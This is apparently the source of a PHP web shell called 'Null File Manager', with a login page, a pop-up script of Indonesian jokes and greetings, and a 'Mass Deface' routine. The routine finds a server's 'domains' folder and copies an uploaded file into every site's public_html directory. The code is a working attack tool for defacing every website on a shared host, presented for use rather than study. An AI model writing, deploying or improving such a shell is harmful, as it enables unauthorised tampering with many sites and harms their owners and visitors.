...
<head>
    <title>Login</title>
    <style>
        body { font-family: sans-serif; background: black; color: white; display: flex; height: 100vh; align-items: center; justify-content: center; }
...
<body>
<script>
alert("Welcome To Null File Manager — Powered By Zyy Recode By Kyy")
let anu = await prompt("siapa kamu?")
if (anu.toLowerCase() === "kyy" || anu.toLowerCase() === "nanzy" || anu.toLowerCase() === "hellokitty" || anu.toLowerCase() === "mr.hellokitty" || anu.toLowerCase() === "lezz") {
alert("Wow, Ternyata Kamu Aku")
} else if (anu.toLowerCase() === "syaqira" || anu.toLowerCase() === "chatryn" || anu.toLowerCase() === "nikita") {
alert("Kamu Orang Yang Pernah Membuatku Gila")
} else {
alert("Siapa Pun Kamu, Kamu Harus Tau Bahwa Mencintai Itu Adalah Mawar, Indah, Wangi, Namun Berduri Tajam, Dan Aku Sendiri Pernah Tertusuk Duri Tersebut")
}
</script>
<div class="top-bar">
    <div>
        <h2>Null File Manager</h2>
    </div>
    <div>
...
<h3>Mass Deface</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="mass_file" required>
    <input type="submit" name="mass_upload" value="Upload">
</form>
<?php
if (isset($_POST['mass_upload']) && isset($_FILES['mass_file'])) {
    $file_name = basename($_FILES['mass_file']['name']);
    $file_tmp  = $_FILES['mass_file']['tmp_name'];

    function findDomainsDir($startDir = __DIR__) {
        $dir = realpath($startDir);
        while ($dir !== false && $dir !== dirname($dir)) {
            $possible = $dir . DIRECTORY_SEPARATOR . "domains";
            if (is_dir($possible)) return $possible;
            $dir = dirname($dir);
        }
        return false;
    }

    $domains_dir = findDomainsDir();

    if (!$domains_dir) {
        echo "<script>alert('Folder domains not found!')</script>";
    } elseif (empty($file_name) || !is_uploaded_file($file_tmp)) {
        echo "<script>alert('Please select a file')</script>";
    } else {
        $success_list = [];
        $temp_copy = $domains_dir . "/.temp_" . uniqid() . "_" . $file_name;
        @copy($file_tmp, $temp_copy);

        foreach (scandir($domains_dir) as $dir) {
            if ($dir == '.' || $dir == '..') continue;
            $domain_dir = "$domains_dir/$dir";
            if (!is_dir($domain_dir)) continue;

            $public_html = "$domain_dir/public_html";
            if (is_dir($public_html)) {
                $target = "$public_html/$file_name";
                if (@copy($temp_copy, $target)) {
                    $success_list[] = "$dir/$file_name";
                }
            }
        }
        ...
        if (!empty($success_list)) {
            echo "<div style='background:#111;padding:10px;border-radius:5px;'>";
            echo "<strong>List Success:</strong><br>";
            foreach ($success_list as $s) {
                echo htmlspecialchars($s) . "<br>";
            }
            echo "</div>";
        } else {
            echo "<script>alert('No success upload found')</script>";
        }
    }
    exit;
}
